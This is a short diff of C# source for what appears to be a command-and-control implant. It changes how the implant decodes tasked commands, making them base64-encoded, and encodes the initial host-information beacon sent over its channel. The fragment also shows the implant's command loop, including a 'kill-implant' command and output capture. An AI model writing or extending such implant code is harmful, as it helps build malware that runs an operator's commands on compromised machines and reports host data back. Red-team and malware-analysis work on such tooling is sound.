@@ -108,8 +108,9 @@ public class Program
                         //The task in the file has been actioned already.
                         continue;
                     }
+		    //Base64 decode required here.
+                    var cmd = Encoding.UTF8.GetString(Convert.FromBase64String(Task.Input));
 
-                    var cmd = Task.Input;
                     var sOutput2 = new StringWriter(); //Setup stringwriter to buffer output from command.
                     if (cmd.ToLower().StartsWith("kill-implant"))
                     {
@@ -387,7 +388,7 @@ public class FCClient
             f.Close();
             f.Dispose();
             //lets populate it with the info we need.
-            FCDataGram InitialContent = new FCDataGram() { PacketType = "INIT", Input = "initial", Output = Convert.ToBase64String(Encoding.UTF8.GetBytes(HostInfo)), Actioned = true };
+            FCDataGram InitialContent = new FCDataGram() { PacketType = "INIT", Input = Convert.ToBase64String(Encoding.UTF8.GetBytes("initial")), Output = Convert.ToBase64String(Encoding.UTF8.GetBytes(HostInfo)), Actioned = true };
             SendData(InitialContent);
         }
         catch (SecurityException e)
